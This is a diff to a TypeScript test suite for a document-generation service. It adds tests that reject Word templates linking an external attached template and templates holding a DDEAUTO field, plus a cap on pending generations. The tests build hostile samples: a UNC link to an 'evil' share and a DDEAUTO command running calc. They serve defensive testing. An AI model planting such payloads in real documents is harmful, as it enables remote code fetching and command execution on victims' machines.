@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: AGPL-3.0-only
 
 /** ADO-004 and ADO-007: Generations cite the submitted pair and keep their own output. */
-import { readdir, readFile } from "node:fs/promises";
+import { readdir, readFile, writeFile } from "node:fs/promises";
 import { join } from "node:path";
 import { afterAll, beforeAll, expect, it } from "vitest";
 import {
@@ -9,15 +9,26 @@ import {
   autoDocGenerationOrigins,
   autoDocs,
   documents,
+  documentVersions,
   entities,
   entityTypes,
   eq,
+  inArray,
   sql,
   users,
 } from "@openlaw/db";
 import { provisionUser } from "../../auth/instance.js";
 import { templateTextParts } from "../../lib/auto-doc-template.js";
 import { AutoDocFillError } from "../../lib/auto-doc-fill/engine.js";
+import { MAX_PENDING_GENERATIONS_PER_PERSON } from "./generations.js";
+import {
+  buildWordPackage,
+  complexField,
+  paragraph,
+  relationships,
+  wordBody,
+  OFFICE_RELATIONSHIPS_NS,
+} from "../../testing/word-package.js";
 import {
   signInCookies,
   startHarness,
@@ -408,4 +419,98 @@ it("removes a completed blob when recording its ready state fails", async () => 
     await h.db.execute(sql`drop trigger refuse_generation_ready on auto_doc_generations`);
     await h.db.execute(sql`drop function refuse_generation_ready()`);
   }
+});
+
+/** The local driver keeps a key as a path under the root, so a suite can
+ * replace a stored template with bytes the upload would have refused. */
+async function overwriteStoredTemplate(documentVersionId: string, bytes: Buffer) {
+  const [version] = await h.db
+    .select({ fileRef: documentVersions.fileRef })
+    .from(documentVersions)
+    .where(eq(documentVersions.id, documentVersionId));
+  const key = version!.fileRef.slice(version!.fileRef.indexOf(":") + 1);
+  await writeFile(join(h.storageRoot, ...key.split("/")), bytes);
+}
+
+it("refuses at upload a template that links an external attached template, naming the reason", async () => {
+  const created = await h.app.inject({
+    method: "POST",
+    url: "/api/v1/auto-docs",
+    cookies: member,
+    payload: { name: "Screened NDA" },
+  });
+  const id: string = created.json().autoDoc.id;
+  const bytes = buildWordPackage({
+    "word/settings.xml": `<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="${OFFICE_RELATIONSHIPS_NS}"><w:attachedTemplate r:id="rId1"/></w:settings>`,
+    "word/_rels/settings.xml.rels": relationships(
+      `<Relationship Id="rId1" Type="${OFFICE_RELATIONSHIPS_NS}/attachedTemplate" Target="file:///\\\\evil\\share\\t.dotm" TargetMode="External"/>`,
+    ),
+  });
+  const uploaded = await h.app.inject({
+    method: "POST",
+    url: `/api/v1/auto-docs/${id}/template`,
+    cookies: member,
+    headers: { "content-type": "multipart/form-data; boundary=screen" },
+    payload: Buffer.concat([
+      Buffer.from(
+        '--screen\r\nContent-Disposition: form-data; name="file"; filename="NDA.docx"\r\nContent-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document\r\n\r\n',
+      ),
+      bytes,
+      Buffer.from("\r\n--screen--\r\n"),
+    ]),
+  });
+  expect(uploaded.statusCode, uploaded.body).toBe(422);
+  expect(uploaded.json().detail).toContain(
+    "external attachedTemplate link in word/_rels/settings.xml.rels",
+  );
+  const read = await h.app.inject({ url: `/api/v1/auto-docs/${id}`, cookies: member });
+  expect(read.json().template).toBeNull();
+});
+
+it("refuses a stored template that fails the screen when it is filled", async () => {
+  const { id, pair } = await prepare();
+  await overwriteStoredTemplate(
+    pair.documentVersionId,
+    buildWordPackage({
+      "word/document.xml": wordBody(
+        paragraph("{{counterparty_name}}") + complexField(' DDEAUTO c:\\\\shell "/c calc" '),
+      ),
+    }),
+  );
+  const made = await call(id, "generations", { ...pair, answers: { counterparty_name: "Acme" } });
+  expect(made.statusCode, made.body).toBe(201);
+  expect(made.json().generation).toMatchObject({
+    state: "failed",
+    hasDocx: false,
+    failure: { code: "fill_failed" },
+  });
+  expect(made.json().generation.failure.detail).toContain("DDEAUTO field in word/document.xml");
+});
+
+it("refuses a new Generation while the person has the pending cap in flight", async () => {
+  const { id, pair } = await prepare();
+  const answers = { counterparty_name: "Acme" };
+  const held: string[] = [];
+  for (let index = 0; index < MAX_PENDING_GENERATIONS_PER_PERSON; index += 1) {
+    const made = await call(id, "generations", { ...pair, answers });
+    expect(made.statusCode, made.body).toBe(201);
+    held.push(made.json().generation.id);
+  }
+  // Back to the state that precedes the PDF and the email, which the row checks allow.
+  await h.db
+    .update(autoDocGenerations)
+    .set({ state: "pending", emailState: "pending", emailSentAt: null, emailFailure: null })
+    .where(inArray(autoDocGenerations.id, held));
+  const refused = await call(id, "generations", { ...pair, answers });
+  expect(refused.statusCode, refused.body).toBe(429);
+  expect(refused.json().detail).toContain(
+    `${MAX_PENDING_GENERATIONS_PER_PERSON} Generations still in progress`,
+  );
+  const admin = await signInCookies(h.app, TEST_ADMIN.email, TEST_ADMIN.password);
+  expect((await call(id, "generations", { ...pair, answers }, admin)).statusCode).toBe(201);
+  await h.db
+    .update(autoDocGenerations)
+    .set({ state: "ready" })
+    .where(inArray(autoDocGenerations.id, held));
+  expect((await call(id, "generations", { ...pair, answers })).statusCode).toBe(201);
 });
